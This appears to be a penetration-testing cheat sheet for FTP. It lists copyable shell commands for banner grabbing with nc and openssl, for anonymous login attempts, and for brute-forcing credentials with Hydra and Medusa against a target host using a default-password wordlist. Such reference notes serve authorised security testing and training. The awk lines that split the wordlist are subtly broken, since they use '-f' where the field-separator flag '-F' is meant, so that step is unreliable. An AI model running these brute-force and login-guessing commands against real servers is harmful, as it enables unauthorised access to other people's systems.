# File Transfer Protocol

## Banner Grabbing

Useful to determine FTP version and capabilities

```shell
nc -vn  $rhost ${port:-21}  # without ssl
openssl s_client -connect $rhost:${port:-21} -starttls ftp  # with ssl
```

## Anonymous Login

Useful to determine FTP version and capabilities

```{.shell .copy}
nc -C $rhost ${port:-21} -w ${timeout:-1} << EOF
USER anonymous
PASS anonymous
HELP
FEAT
EOF
```

## Brute force

```{.shell .copy title="Default credentials"}
user_pass=/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
awk -f ':' '{print $1}' $user_pass > users.txt
awk -f ':' '{print $2}' $user_pass > passwords.txt
users=users.txt
passwords=passwords.txt
```

```{.shell .copy title="Hydra"}
hydra \
 -e nsr \
 -s ${port:-21} \
 -L $users \
 -P $passwords \
 -o "$rhost-hydra-ftp" \
 ftp://$rhost
```

```{.shell .copy title="Medusa"}
medusa \
 -e ns \
 -n ${port:-21} \
 -U $users \
 -p $passwords \
 -O "$rhost-medusa-ftp" \
 -M ftp \
 -h $rhost
```
